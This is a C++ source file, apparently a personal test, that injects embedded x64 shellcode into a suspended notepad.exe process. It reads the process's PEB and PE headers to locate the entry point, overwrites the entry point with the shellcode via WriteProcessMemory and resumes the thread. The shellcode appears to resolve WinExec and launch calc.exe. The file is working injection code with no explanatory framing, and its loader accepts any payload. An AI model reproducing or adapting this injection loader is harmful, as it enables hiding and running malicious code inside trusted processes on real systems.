// Testing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <winternl.h> 
#pragma comment(lib, "ntdll")

unsigned char payload[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6";

void RemotePebWalker() {
    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{}; 

    si.cb = sizeof(si); 
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    /* parse PEB of new process */
    PROCESS_BASIC_INFORMATION info{}; 
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &info, sizeof(PROCESS_BASIC_INFORMATION), NULL); 
    info.PebBaseAddress;

    PVOID pebraw = malloc(sizeof(PEB)); 
    SIZE_T bytesread = 0; 
    ReadProcessMemory(pi.hProcess, info.PebBaseAddress, pebraw, sizeof(PEB), &bytesread); 

    PEB* peb = (PEB*)pebraw; 
    
    PVOID rBaseAddr = peb->Reserved3[1]; 
    std::cout << rBaseAddr << std::endl; 

    /* get elfnew */
    PVOID dosRaw = malloc(sizeof(IMAGE_DOS_HEADER));
    ReadProcessMemory(pi.hProcess, rBaseAddr, dosRaw, sizeof(IMAGE_DOS_HEADER), NULL);

    PIMAGE_DOS_HEADER imgHdr = (PIMAGE_DOS_HEADER)dosRaw; 
    std::cout << "offset: " << imgHdr->e_lfanew << std::endl;

    /* get fileheader */
    PVOID ntRaw = malloc(sizeof(IMAGE_NT_HEADERS));
    BYTE* b = (BYTE*)rBaseAddr+imgHdr->e_lfanew; 
    ReadProcessMemory(pi.hProcess, b, ntRaw, sizeof(IMAGE_NT_HEADERS), NULL);

    PIMAGE_NT_HEADERS ntHead = (PIMAGE_NT_HEADERS)ntRaw; 
    DWORD AoEOffset = ntHead->OptionalHeader.AddressOfEntryPoint;

    BYTE* AoE = AoEOffset + (BYTE*)(rBaseAddr); 
    std::cout << "Address of Entry: " << (PVOID)AoE  << std::endl;

    /* writeprocessmemory to AoE */

    SIZE_T shellywritten = 0; 
    WriteProcessMemory(pi.hProcess, AoE, payload, sizeof(payload), &shellywritten); 

    std::cout << "shellcode bytes written: " << shellywritten << std::endl; 


    /* cleanup */
    //BOOL suc = TerminateProcess(pi.hProcess, 1);

    ResumeThread(pi.hThread); 

    Sleep(1000); 

    /* close handles */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


void PebWalker() {
    _PROCESS_BASIC_INFORMATION info = { 0 }; 
    NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &info, sizeof(_PROCESS_BASIC_INFORMATION), NULL);
    std::cout << "Peb Address" << info.PebBaseAddress << std::endl;

    PEB* pebby = (PEB*)(info.PebBaseAddress); 
    std::cout << "Image base address: " << pebby->Reserved3[1] << std::endl;
    LDR_DATA_TABLE_ENTRY* f = (LDR_DATA_TABLE_ENTRY*)(pebby->Ldr->InMemoryOrderModuleList.Flink);


}       

int main()
{
    RemotePebWalker();
    //PebWalker(); 
    std::cout << "Hello World!\n";
}
